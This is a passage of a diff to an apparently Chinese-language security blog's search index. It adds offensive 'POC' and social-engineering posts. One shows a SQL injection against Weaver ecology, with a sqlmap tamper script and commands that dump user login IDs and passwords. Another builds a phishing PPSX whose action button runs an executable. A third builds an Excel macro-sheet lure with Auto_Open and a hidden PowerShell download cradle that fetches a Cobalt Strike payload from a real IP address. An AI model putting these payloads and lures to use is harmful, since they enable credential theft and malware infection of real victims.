class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
+<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
+<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
     <title>win10启用administrator</title>
     <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/win10%E5%90%AF%E7%94%A8administrator/</url>
     <content><![CDATA[<h2 id="激活administrator"><a href="#激活administrator" class="headerlink" title="激活administrator"></a>激活administrator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> net user administrator /active:yes</span><br></pre></td></tr></table></figure>
@@ -2339,6 +2384,27 @@
 ]]></content>
       <categories>
         <category>windows相关</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>PPT动作按钮特性构造PPSX钓鱼</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
+<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
+<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
+<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
+<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
+<p>该利用方式同时适用于wps</p>
+]]></content>
+      <categories>
+        <category>社工</category>
       </categories>
   </entry>
   <entry>
@@ -2439,21 +2505,32 @@
       </categories>
   </entry>
   <entry>
-    <title>PPT动作按钮特性构造PPSX钓鱼</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
-<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
-<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
-<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
+    <title>excel钓鱼(office)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
+    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
+<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
+<p>会多出一栏宏</p>
+<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>
 
-<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
-<p>如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
-<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
-<p>该利用方式同时适用于wps</p>
+<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
+<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
+<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
+<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
+<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
+<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
+<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
+<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
+<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
+<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
@@ -2505,38 +2582,6 @@
 
 <h5 id="命令行颜色相关"><a href="#命令行颜色相关" class="headerlink" title="命令行颜色相关"></a>命令行颜色相关</h5><p><img src="/images/1662389741911-16d24671-1089-4391-8d80-37748a3c7d8f.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>社工</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>excel钓鱼(office)</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
-    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
-<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
-<p>会多出一栏宏</p>
-<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
-<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
-<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
-<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
-<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
-<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
-<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
-<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
-<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
-<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
-<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
 ]]></content>
       <categories>
         <category>社工</category>
